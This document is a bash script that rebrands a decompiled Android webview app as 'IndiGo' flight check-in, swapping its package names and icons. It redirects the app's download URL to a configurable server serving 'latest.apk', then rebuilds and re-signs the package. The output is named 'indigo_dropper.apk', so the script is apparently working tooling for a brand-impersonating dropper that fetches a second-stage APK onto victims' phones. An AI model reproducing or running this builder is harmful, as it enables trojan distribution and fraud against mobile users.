#!/bin/bash
set -e

BASE_DIR="$(cd "$(dirname "$0")" && pwd)"
DECOMPILED="$BASE_DIR/decompiled"
WORK_DIR="$BASE_DIR/work"
OUTPUT_DIR="$BASE_DIR/output"
KEYSTORE="$BASE_DIR/../debug.keystore"

NEW_PACKAGE="${NEW_PACKAGE:-com.indigo.flight.checkin}"
NEW_APP_NAME="${NEW_APP_NAME:-IndiGo}"
NEW_APP_PACKAGE="${NEW_APP_PACKAGE:-com.indigo.webview}"
NEW_SERVER_URL="${NEW_SERVER_URL:-http://10.0.2.2:3000}"
PAYLOAD_ICONS_DIR="${PAYLOAD_ICONS_DIR:-}"
POSTER_FILE="${POSTER_FILE:-}"

rm -rf "$WORK_DIR" "$OUTPUT_DIR"
mkdir -p "$WORK_DIR" "$OUTPUT_DIR"

cp -r "$DECOMPILED"/* "$WORK_DIR/"

if [ ! -f "$KEYSTORE" ]; then
  keytool -genkey -v -keystore "$KEYSTORE" -alias debug -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=Debug, OU=Debug, O=Debug, L=Debug, ST=Debug, C=US"
fi

echo "[*] Modifying AndroidManifest.xml..."
sed -i '' 's/package="com\.martbigsghopppn\.fastfredelivry"/package="'"$NEW_PACKAGE"'"/g' "$WORK_DIR/AndroidManifest.xml"
sed -i '' 's/com\.mart\.updatenow\.file_provider/com.indigo.flight.checkin.file_provider/g' "$WORK_DIR/AndroidManifest.xml"
sed -i '' 's/com\.mart\.updatenow\.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION/com.indigo.flight.checkin.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION/g' "$WORK_DIR/AndroidManifest.xml"
sed -i '' 's/com\.mart\.updatenow\.androidx-startup/com.indigo.flight.checkin.androidx-startup/g' "$WORK_DIR/AndroidManifest.xml"

echo "[*] Removing cleartext traffic flag..."
sed -i '' 's/android:usesCleartextTraffic="true"//g' "$WORK_DIR/AndroidManifest.xml"

echo "[*] Updating class names in AndroidManifest.xml..."
sed -i '' 's|com\.mart\.updatenow\.|com.indigo.flight.checkin.|g' "$WORK_DIR/AndroidManifest.xml"

echo "[*] Moving smali directories..."
mkdir -p "$WORK_DIR/smali/com/indigo/flight/checkin"
cp -r "$WORK_DIR/smali/com/mart/updatenow/"* "$WORK_DIR/smali/com/indigo/flight/checkin/"
rm -rf "$WORK_DIR/smali/com/mart"

echo "[*] Updating smali package references..."
find "$WORK_DIR/smali" -name "*.smali" -exec sed -i '' 's|Lcom/mart/updatenow/|Lcom/indigo/flight/checkin/|g' {} +
find "$WORK_DIR/smali" -name "*.smali" -exec sed -i '' 's|com\.mart\.updatenow|com.indigo.flight.checkin|g' {} +

echo "[*] Updating server URL in smali..."
sed -i '' 's|https://nexuswrap\.replit\.app/api/apk/auto-wrap/dmart_shopping_webview/download|'"$NEW_SERVER_URL"'/api/download/latest.apk|g' "$WORK_DIR/smali/com/indigo/flight/checkin/MainActivity.smali"

echo "[*] Updating secondary download URL in H0/a.smali..."
sed -i '' 's|https://nexuswrap\.replit\.app/api/apk/auto-wrap/dmart_shopping_webview/download|'"$NEW_SERVER_URL"'/api/download/latest.apk|g' "$WORK_DIR/smali/H0/a.smali"

echo "[*] Updating queries package in AndroidManifest.xml..."
sed -i '' 's|"com\.dmart\.webview"|"'"$NEW_APP_PACKAGE"'"|g' "$WORK_DIR/AndroidManifest.xml"

echo "[*] Updating app_package references in smali..."
sed -i '' 's|"com\.dmart\.webview"|"'"$NEW_APP_PACKAGE"'"|g' "$WORK_DIR/smali/com/indigo/flight/checkin/"*.smali

echo "[*] Modifying strings.xml..."
sed -i '' 's/D-Mart Shopping/'"$NEW_APP_NAME"'/g' "$WORK_DIR/res/values/strings.xml"
sed -i '' 's/com\.dmart\.webview/'"$NEW_APP_PACKAGE"'/g' "$WORK_DIR/res/values/strings.xml"

if [ -n "$PAYLOAD_ICONS_DIR" ] && [ -d "$PAYLOAD_ICONS_DIR" ]; then
  echo "[*] Replacing icons with payload icons..."
  replaced=0
  # Build array of target density dirs (preserving spaces in paths)
  tgt_dirs=()
  while IFS= read -r -d '' d; do
    [ "$(basename "$d")" = "mipmap-anydpi-v26" ] && continue
    tgt_dirs+=("$d")
  done < <(find "$WORK_DIR/res" -maxdepth 1 -type d -name 'mipmap-*' -print0)
  # Copy mipmap icons from payload to ALL densities
  while IFS= read -r -d '' payload_dir; do
    [ "$(basename "$payload_dir")" = "mipmap-anydpi-v26" ] && continue
    while IFS= read -r -d '' f; do
      [ ! -f "$f" ] && continue
      bname=$(basename "$f")
      name="${bname%.*}"
      ext="${bname##*.}"
      for tgt_dir in "${tgt_dirs[@]}"; do
        cp "$f" "$tgt_dir/ic_launcher.$ext" 2>/dev/null || true
        cp "$f" "$tgt_dir/ic_launcher_round.$ext" 2>/dev/null || true
        cp "$f" "$tgt_dir/ic_launcher_foreground.$ext" 2>/dev/null || true
      done
      replaced=$((replaced+1))
    done < <(find "$payload_dir" -maxdepth 1 -type f -print0)
  done < <(find "$PAYLOAD_ICONS_DIR" -maxdepth 1 -type d -name 'mipmap-*' -print0)
  # Fallback: handle icons from drawable directories, map to all densities
  while IFS= read -r -d '' drawable_dir; do
    dname=$(basename "$drawable_dir")
    for f in "$drawable_dir"/*; do
      [ -f "$f" ] || continue
      bname=$(basename "$f")
      name="${bname%.*}"
      ext="${bname##*.}"
      case "$name" in
        app_icon|icon|ic_launcher) ;;
        *) continue ;;
      esac
      for tgt_dir in "${tgt_dirs[@]}"; do
        cp "$f" "$tgt_dir/ic_launcher.$ext" 2>/dev/null || true
        cp "$f" "$tgt_dir/ic_launcher_round.$ext" 2>/dev/null || true
        cp "$f" "$tgt_dir/ic_launcher_foreground.$ext" 2>/dev/null || true
        replaced=$((replaced+1))
      done
      echo "  -> Copied $bname to all densities as launcher+foreground"
    done
  done < <(find "$PAYLOAD_ICONS_DIR" -maxdepth 1 -type d -name 'drawable*' -print0)
  # CRITICAL: Remove adaptive icon XMLs so the flat PNGs are used on API 26+
  rm -f "$WORK_DIR/res/mipmap-anydpi-v26/ic_launcher.xml" "$WORK_DIR/res/mipmap-anydpi-v26/ic_launcher_round.xml" 2>/dev/null || true
  if [ $replaced -eq 0 ]; then
    echo "  [!] No matching icon files found in payload"
  else
    echo "  -> Replaced icons in $replaced density dirs"
  fi
fi

if [ -n "$POSTER_FILE" ] && [ -f "$POSTER_FILE" ]; then
  ft=$(file -b "$POSTER_FILE")
  case "$ft" in
    *PNG*image*) ext=png ;;
    *JPEG*image*|*JFIF*) ext=jpg ;;
    *WebP*image*) ext=webp ;;
    *GIF*image*) ext=gif ;;
    *)
      echo "[!] Poster file is not a valid image ($ft), skipping"
      ext=""
      ;;
  esac
  if [ -n "$ext" ]; then
    echo "[*] Replacing poster image... (detected: $ext)"
    rm -f "$WORK_DIR/res/drawable/dmrt.webp" "$WORK_DIR/res/drawable/dmrt.png"
    cp "$POSTER_FILE" "$WORK_DIR/res/drawable/dmrt.$ext"
  fi
fi

echo "[*] Rebuilding APK..."
rm -f "$WORK_DIR/build" "$WORK_DIR/dist" -rf 2>/dev/null

cd "$WORK_DIR"
apktool b . -o "$OUTPUT_DIR/indigo_dropper_unsigned.apk" 2>&1

# Align
ALIGNED_APK="$OUTPUT_DIR/indigo_dropper_aligned.apk"
ZIPALIGN=""
for f in "$ANDROID_HOME"/build-tools/*/zipalign /Library/Android/sdk/build-tools/*/zipalign ~/Library/Android/sdk/build-tools/*/zipalign; do
  if [ -x "$f" ]; then ZIPALIGN="$f"; break; fi
done
if [ -z "$ZIPALIGN" ]; then
  ZIPALIGN=$(command -v zipalign 2>/dev/null)
fi
if [ -n "$ZIPALIGN" ]; then
  echo "[*] Aligning APK..."
  "$ZIPALIGN" -v -p 4 "$OUTPUT_DIR/indigo_dropper_unsigned.apk" "$ALIGNED_APK" 2>&1
  rm -f "$OUTPUT_DIR/indigo_dropper_unsigned.apk"
else
  mv "$OUTPUT_DIR/indigo_dropper_unsigned.apk" "$ALIGNED_APK"
fi

echo "[*] Signing APK with apksigner..."
APKSIGNER=""
for f in "$ANDROID_HOME"/build-tools/*/apksigner /Library/Android/sdk/build-tools/*/apksigner ~/Library/Android/sdk/build-tools/*/apksigner; do
  if [ -x "$f" ]; then APKSIGNER="$f"; break; fi
done
if [ -z "$APKSIGNER" ]; then
  APKSIGNER=$(command -v apksigner 2>/dev/null)
fi
if [ -n "$APKSIGNER" ]; then
  "$APKSIGNER" sign --ks "$KEYSTORE" --ks-pass pass:android --ks-key-alias debug --v2-signing-enabled true --v3-signing-enabled true "$ALIGNED_APK" 2>&1
  mv "$ALIGNED_APK" "$OUTPUT_DIR/indigo_dropper.apk"
else
  jarsigner -keystore "$KEYSTORE" -storepass android -keypass android -sigalg SHA1withRSA -digestalg SHA1 "$ALIGNED_APK" debug 2>&1
  mv "$ALIGNED_APK" "$OUTPUT_DIR/indigo_dropper.apk"
fi

echo ""
echo "=== Dropper APK built: $OUTPUT_DIR/indigo_dropper.apk ==="
